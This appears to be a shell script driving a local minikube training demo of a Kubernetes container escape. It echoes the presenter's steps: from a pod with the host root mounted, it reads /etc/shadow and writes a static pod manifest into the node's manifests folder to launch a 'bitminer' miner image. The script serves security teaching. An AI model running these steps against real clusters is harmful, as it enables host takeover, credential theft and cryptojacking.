# https://stackoverflow.com/questions/42564058/how-to-use-local-docker-images-with-minikube
# https://kubernetes.io/docs/concepts/containers/images/ 

# Text: 
# start.sh 
# Dockerfile.capsh
# mount-root.yaml
# bitminer.yaml


# Vorbereitung 
minikube stop
minikube start
eval $(minikube docker-env)
kubectl delete pod nginx
minikube ssh sudo rm /etc/kubernetes/manifests/injectHost.yaml
minikube ssh "docker build -f /hosthome/user/AKDB\ Schulung/running-with-scissors/Dockerfile.bitminer -t bitminer:0.1 ."
minikube ssh "sudo rm /SOMEfile.TXT"

# build nginx
docker build -f Dockerfile.capsh -t nginx:capsh .

# build bitminer
docker build -f Dockerfile.bitminer -t bitminer:0.1 .

# Apply new config
#kubectl apply -f pod.yaml
echo "#############################################"
echo "user"
echo "kubectl apply -f mount-root.yaml"

# Window 1: Enter container
echo "gnome-terminal -e 'kubectl exec -it nginx /bin/bash'"

# Window 2: show the running pods
gnome-terminal -e 'watch kubectl get pods'

# Window 3: enter Minikube Node 
gnome-terminal -e 'minikube ssh'

#############################################
# Minikube
#############################################
echo "#############################################"
echo "Minikube"
echo "cd /"

echo "ls"

echo "#############################################"

#############################################
# Container
#############################################
echo "Container"

echo "cd /host"
echo "touch SOMEfile.TXT"

echo "cat ./etc/shadow"
# check

echo "cd /host/etc/kubernetes/manifests/"

echo "ls"

echo "cat << EOF > injectHost.yaml
apiVersion: v1
kind: Pod
metadata:
  name: bitminer
  labels:
    app: bitminer
spec:
  containers:
  - name: naughty
    image: bitminer:0.1
EOF"
echo "#############################################"
echo "user"
# Fenster 4:
echo "kubectl logs -f bitminer-minikube"
echo "#############################################"

# Destory all:
#kubectl delete pod nginx
#minikube ssh sudo rm /etc/kubernetes/manifests/injectHost.yaml
